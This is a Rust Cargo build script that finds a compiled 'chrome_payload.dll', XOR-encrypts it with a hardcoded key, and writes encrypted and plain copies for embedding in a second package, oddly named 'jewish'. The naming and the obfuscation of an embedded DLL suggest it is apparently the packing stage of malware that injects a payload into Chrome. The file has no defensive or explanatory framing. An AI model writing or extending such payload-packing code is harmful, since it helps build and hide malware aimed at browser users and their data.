use std::{env, fs, path::PathBuf};

const PAYLOAD_KEY: &[u8] = b"chrome_payload_k";

fn xor_payload(data: &[u8]) -> Vec<u8> {
    data.iter()
        .enumerate()
        .map(|(i, &b)| b ^ PAYLOAD_KEY[i % PAYLOAD_KEY.len()])
        .collect()
}

fn main() {
    let manifest_dir = PathBuf::from(env!("CARGO_MANIFEST_DIR"));
    let out_dir = env::var("OUT_DIR")
        .map(PathBuf::from)
        .expect("OUT_DIR not set");
    let out_plain = out_dir.join("payload.dll");
    let out_enc = out_dir.join("payload.enc");

    let candidates = [
        env::var("CHROME_PAYLOAD_DLL")
            .ok()
            .map(PathBuf::from),
        Some(manifest_dir.join("target/release/chrome_payload.dll")),
        env::var("CARGO_TARGET_DIR")
            .ok()
            .map(|d| PathBuf::from(d).join("release/chrome_payload.dll")),
    ];

    for src in candidates.into_iter().flatten() {
        if !src.exists() {
            continue;
        }
        let raw = fs::read(&src).expect("read payload dll");
        if raw.is_empty() {
            continue;
        }
        let encrypted = xor_payload(&raw);
        fs::write(&out_enc, &encrypted).expect("write encrypted payload");
        fs::write(&out_plain, &raw).expect("write plain payload copy");
        println!("cargo:rerun-if-changed={}", src.display());
        return;
    }

    panic!(
        "chrome_payload.dll not found or empty.\n\
         Run: cargo build --release -p chrome-payload\n\
         Then: cargo build --release -p jewish"
    );
}
